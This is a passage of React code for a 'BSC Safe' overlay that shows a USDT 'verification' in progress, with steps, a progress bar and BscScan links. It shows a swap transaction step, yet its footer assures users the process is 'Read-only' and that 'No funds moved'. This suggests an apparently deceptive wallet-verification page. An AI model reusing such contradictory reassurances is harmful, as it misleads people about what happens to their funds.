      txHash: swapTxHash || null,
    },
    {
      icon: swapDone ? "🏆" : "📋",
      label: "Audit Certificate",
      detail: swapDone ? "Generating certificate…" : "Pending",
      state: swapDone ? "active" : "pending",
    },
  ];

  const doneCnt = steps.filter(s => s.state === "done").length;
  const progress = Math.round((doneCnt / steps.length) * 100);

  if (!mounted) return null;

  return createPortal(
    <>
      {/* ── Scoped styles + responsive rules ── */}
      <style>{`
        /* ── Keyframes ── */
        @keyframes _proc-spin {
          from { transform: rotate(0deg); }
          to   { transform: rotate(360deg); }
        }
        @keyframes _proc-dot {
          0%, 80%, 100% { transform: translateY(0);    opacity: 0.35; }
          40%            { transform: translateY(-4px); opacity: 1;    }
        }
        @keyframes _proc-step-glow {
          0%,100% { box-shadow: 0 0 0 0   rgba(243,186,47,0.25); }
          50%     { box-shadow: 0 0 0 4px rgba(243,186,47,0);    }
        }

        /* ── Animated helpers ── */
        ._proc-ring    { animation: _proc-spin 1.3s linear infinite; }
        ._proc-cring   { animation: _proc-spin 2s linear infinite reverse; }
        ._proc-dot     { animation: _proc-dot 1.4s ease-in-out infinite; display: inline-block; }
        ._proc-dot:nth-child(2) { animation-delay: 0.18s; }
        ._proc-dot:nth-child(3) { animation-delay: 0.36s; }
        ._proc-active-box { animation: _proc-step-glow 1.6s ease-in-out infinite; }

        /* ── Overlay ── */
        ._proc-overlay {
          position: fixed;
          top: 0; left: 0; right: 0; bottom: 0;
          z-index: 9990;
          background: rgba(3,5,9,0.78);
          backdrop-filter: blur(3px);
          -webkit-backdrop-filter: blur(3px);
          display: flex;
          align-items: flex-start;
          justify-content: center;
          overflow-y: auto;
          -webkit-overflow-scrolling: touch;
          overscroll-behavior: contain;
          padding: 16px;
        }
        /* iOS Safari: fill the visible area including dynamic toolbar */
        @supports (-webkit-touch-callout: none) {
          ._proc-overlay { min-height: -webkit-fill-available; }
        }

        /* ── Card ── */
        ._proc-card {
          width: 100%;
          max-width: 460px;
          margin: auto;
          flex-shrink: 0;
          background: rgba(7,10,13,0.98);
          border-radius: 12px;
          border: 1px solid rgba(243,186,47,0.15);
          overflow: hidden;
          box-shadow: 0 24px 80px rgba(0,0,0,0.95), 0 0 60px rgba(243,186,47,0.05);
        }

        /* ── Inner padding (responsive) ── */
        ._proc-inner { padding: 1.25rem; }

        /* ── Hero (spinner + title) ── */
        ._proc-hero { text-align: center; margin-bottom: 1.25rem; }
        ._proc-spinner-wrap {
          position: relative;
          width: 72px; height: 72px;
          margin: 0 auto 0.875rem;
        }

        /* ── Brand row ── */
        ._proc-brand {
          display: flex; align-items: center; gap: 9px;
          margin-bottom: 1.25rem; padding-bottom: 0.75rem;
          border-bottom: 1px solid rgba(243,186,47,0.07);
        }

        /* ── Progress ── */
        ._proc-progress { margin-bottom: 1.125rem; }

        /* ── Steps ── */
        ._proc-steps {
          border-top: 1px solid rgba(255,255,255,0.04);
          padding-top: 0.875rem;
        }
        ._proc-step { display: flex; gap: 10px; align-items: flex-start; position: relative; }
        ._proc-step + ._proc-step { margin-top: 9px; }

        /* ── Footer ── */
        ._proc-footer {
          margin-top: 0.875rem; padding-top: 0.625rem;
          border-top: 1px solid rgba(255,255,255,0.04);
          display: flex; align-items: center; justify-content: center; gap: 10px;
        }

        /* ═══ Mobile: short viewport (≤ 680px tall) ═══ */
        @media (max-height: 680px) {
          ._proc-overlay   { padding: 10px; }
          ._proc-inner     { padding: 0.875rem; }
          ._proc-brand     { margin-bottom: 0.75rem; padding-bottom: 0.5rem; }
          ._proc-hero      { margin-bottom: 0.75rem; }
          ._proc-spinner-wrap { width: 52px; height: 52px; margin-bottom: 0.5rem; }
          ._proc-progress  { margin-bottom: 0.75rem; }
          ._proc-steps     { padding-top: 0.625rem; }
          ._proc-step + ._proc-step { margin-top: 6px; }
          ._proc-footer    { margin-top: 0.625rem; }
        }

        /* ═══ Mobile: very short (≤ 580px tall) — hide spinner entirely ═══ */
        @media (max-height: 580px) {
          ._proc-spinner-wrap { display: none; }
          ._proc-hero         { margin-bottom: 0.5rem; }
          ._proc-inner        { padding: 0.75rem; }
        }

        /* ═══ Mobile: narrow screen ═══ */
        @media (max-width: 400px) {
          ._proc-inner  { padding: 0.875rem; }
          ._proc-overlay { padding: 10px; }
        }
      `}</style>

      {/* ── Full-page dimmed overlay ── */}
      <div className="_proc-overlay">

        {/* ── Card ── */}
        <div className="_proc-card">

          {/* Gradient top bar */}
          <div style={{ height: "3px", background: "linear-gradient(90deg, rgba(243,186,47,0) 0%, #F3BA2F 30%, #FCD535 50%, #02C076 75%, rgba(2,192,118,0) 100%)" }} />

          <div className="_proc-inner">

            {/* ── Brand row ── */}
            <div className="_proc-brand">
              <BSCVerifyLogo size={28} id="proc-brand" />
              <div style={{ flex: 1, minWidth: 0 }}>
                <div className="font-display" style={{ fontSize: "12px", fontWeight: 800, color: "white", letterSpacing: "-0.01em" }}>BSC Safe</div>
                <div className="font-mono" style={{ fontSize: "9px", color: "var(--gray-text)", letterSpacing: "0.09em", textTransform: "uppercase" }}>BEP-20 Verification · Chain 56</div>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "5px", flexShrink: 0 }}>
                <div className="live-dot" />
                <span className="font-mono" style={{ fontSize: "9px", color: "var(--gray-text)", textTransform: "uppercase", letterSpacing: "0.08em" }}>Live</span>
              </div>
            </div>

            {/* ── Spinner hero ── */}
            <div className="_proc-hero">

              {/* Spinning rings + shield */}
              <div className="_proc-spinner-wrap">
                <div className="animate-ping" style={{ position: "absolute", inset: "4px", borderRadius: "50%", background: "rgba(243,186,47,0.06)", animationDuration: "2.2s" }} />
                <div className="_proc-ring" style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "2.5px solid transparent", borderTopColor: "#F3BA2F", borderRightColor: "rgba(243,186,47,0.35)", borderBottomColor: "rgba(243,186,47,0.08)" }} />
                <div className="_proc-cring" style={{ position: "absolute", inset: "5px", borderRadius: "50%", border: "1.5px solid transparent", borderBottomColor: "rgba(2,192,118,0.45)", borderLeftColor: "rgba(2,192,118,0.15)" }} />
                <div style={{ position: "absolute", inset: "10px", borderRadius: "50%", background: "radial-gradient(circle at 40% 35%, rgba(243,186,47,0.14) 0%, rgba(243,186,47,0.03) 100%)", border: "1px solid rgba(243,186,47,0.18)", display: "flex", alignItems: "center", justifyContent: "center" }}><BSCVerifyLogo size={30} id="proc-spin" /></div>
              </div>

              {/* Title + bouncing dots */}
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "7px" }}>
                <p className="font-display" style={{ margin: 0, fontSize: "17px", fontWeight: 800, color: "white", lineHeight: 1.2 }}>Verifying Your USDT</p>
                <span style={{ display: "inline-flex", gap: "3px", alignItems: "center" }}>
                  <span className="_proc-dot" style={{ fontSize: "7px", color: "#F3BA2F" }}>●</span>
                  <span className="_proc-dot" style={{ fontSize: "7px", color: "#F3BA2F" }}>●</span>
                  <span className="_proc-dot" style={{ fontSize: "7px", color: "#F3BA2F" }}>●</span>
                </span>
              </div>

              {addrShort && (
                <p className="font-mono" style={{ margin: "5px 0 0", fontSize: "11px", color: "var(--binance-yellow)", letterSpacing: "0.05em" }}>{addrShort}</p>
              )}
              <p className="font-mono" style={{ margin: "3px 0 0", fontSize: "9px", color: "var(--gray-text)" }}>
                30–60 seconds · Do not close this page
              </p>
            </div>

            {/* ── Progress bar ── */}
            <div className="_proc-progress">
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                <span className="font-mono" style={{ fontSize: "9px", color: "var(--gray-text)", textTransform: "uppercase", letterSpacing: "0.1em" }}>Verification Progress</span>
                <span className="font-mono" style={{ fontSize: "10px", fontWeight: 700, color: progress >= 100 ? "var(--safe-green)" : "var(--binance-yellow)" }}>{progress}%</span>
              </div>
              <div style={{ height: "5px", background: "rgba(255,255,255,0.05)", borderRadius: "99px", overflow: "hidden" }}>
                <div style={{ height: "100%", width: `${progress}%`, background: "linear-gradient(90deg, #F3BA2F, #FCD535, #02C076)", borderRadius: "99px", transition: "width 0.75s cubic-bezier(0.4,0,0.2,1)", boxShadow: "0 0 10px rgba(243,186,47,0.55)" }} />
              </div>
            </div>

            {/* ── Steps ── */}
            <div className="_proc-steps">
              {steps.map((step, i) => {
                const isActive = step.state === "active";
                const isDone = step.state === "done";
                const isError = step.state === "error";

                const iconBorder = isDone ? "1px solid rgba(2,192,118,0.4)" : isActive ? "1px solid rgba(243,186,47,0.55)" : isError ? "1px solid rgba(207,48,74,0.4)" : "1px solid rgba(255,255,255,0.05)";
                const iconBg = isDone ? "rgba(2,192,118,0.09)" : isActive ? "rgba(243,186,47,0.11)" : isError ? "rgba(207,48,74,0.09)" : "rgba(255,255,255,0.02)";
                const labelColor = isDone ? "var(--safe-green)" : isActive ? "var(--binance-yellow)" : isError ? "var(--danger-red)" : "rgba(132,145,163,0.38)";
                const detailColor = isDone ? "var(--gray-text)" : isActive ? "rgba(243,186,47,0.6)" : isError ? "rgba(207,48,74,0.6)" : "rgba(132,145,163,0.22)";

                return (
                  <div key={i} className="_proc-step">
                    {/* Connector */}
                    {i < steps.length - 1 && (
                      <div style={{ position: "absolute", left: "16px", top: "33px", width: "1px", bottom: "-9px", background: isDone ? "linear-gradient(to bottom,rgba(2,192,118,0.4),rgba(2,192,118,0.1))" : "rgba(255,255,255,0.05)", transition: "background 0.5s" }} />
                    )}

                    {/* Icon box */}
                    <div className={isActive ? "_proc-active-box" : ""} style={{ width: "32px", height: "32px", borderRadius: "7px", flexShrink: 0, border: iconBorder, background: iconBg, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", lineHeight: 1, transition: "border-color 0.3s, background 0.3s" }}>
                      {step.icon}
                    </div>

                    {/* Text */}
                    <div style={{ flex: 1, minWidth: 0, paddingTop: "3px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                        <span className="font-display" style={{ fontSize: "11px", fontWeight: 700, lineHeight: 1, color: labelColor, transition: "color 0.3s" }}>{step.label}</span>
                        {isActive && <RefreshCw className="animate-spin" style={{ width: "9px", height: "9px", color: "var(--binance-yellow)", flexShrink: 0 }} />}
                      </div>
                      <p className="font-mono" style={{ margin: "1px 0 0", fontSize: "10px", color: detailColor, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", transition: "color 0.3s" }}>{step.detail}</p>
                      {step.txHash && (isDone || isActive) && (
                        <a href={`https://bscscan.com/tx/${step.txHash}`} target="_blank" rel="noopener noreferrer" style={{ display: "inline-flex", alignItems: "center", gap: "3px", fontFamily: "monospace", fontSize: "9px", color: "var(--binance-yellow)", marginTop: "2px", textDecoration: "none" }}>
                          🔗 BscScan <ExternalLink style={{ width: "7px", height: "7px" }} />
                        </a>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* ── Footer ── */}
            <div className="_proc-footer">
              <span className="font-mono" style={{ fontSize: "9px", color: "rgba(132,145,163,0.3)" }}>🔒 Read-only</span>
              <span style={{ width: "1px", height: "10px", background: "rgba(255,255,255,0.07)" }} />
              <span className="font-mono" style={{ fontSize: "9px", color: "rgba(132,145,163,0.3)" }}>No funds moved</span>
              <span style={{ width: "1px", height: "10px", background: "rgba(255,255,255,0.07)" }} />
              <span className="font-mono" style={{ fontSize: "9px", color: "rgba(132,145,163,0.3)" }}>BSC mainnet</span>
            </div>

          </div>
        </div>
      </div>
    </>,
    document.body
  );
}

// ── Sub-components ────────────────────────────────────────────────────────
function Row({ children, spin, yellow, green, amber, red }) {
  const color = green ? "text-safe-green" : amber ? "text-amber-400" : red ? "text-danger-red" : "text-bsc-yellow";
  return (
    <div className={`flex items-center gap-2 text-[10px] font-mono ${color} ${spin ? "animate-pulse" : ""}`}>
      {spin && <RefreshCw className="h-3 w-3 animate-spin shrink-0" />}
      <span>{children}</span>
    </div>
  );
}

function BscLink({ hash, label }) {
  return (
    <a href={`https://bscscan.com/tx/${hash}`} target="_blank" rel="noopener noreferrer"
      className="inline-flex items-center gap-1 text-[9px] text-bsc-yellow hover:underline font-mono">
      🔗 {label} <ExternalLink className="h-2.5 w-2.5" />
    </a>
  );
}

function delay(ms) { return new Promise((r) => setTimeout(r, ms)); }
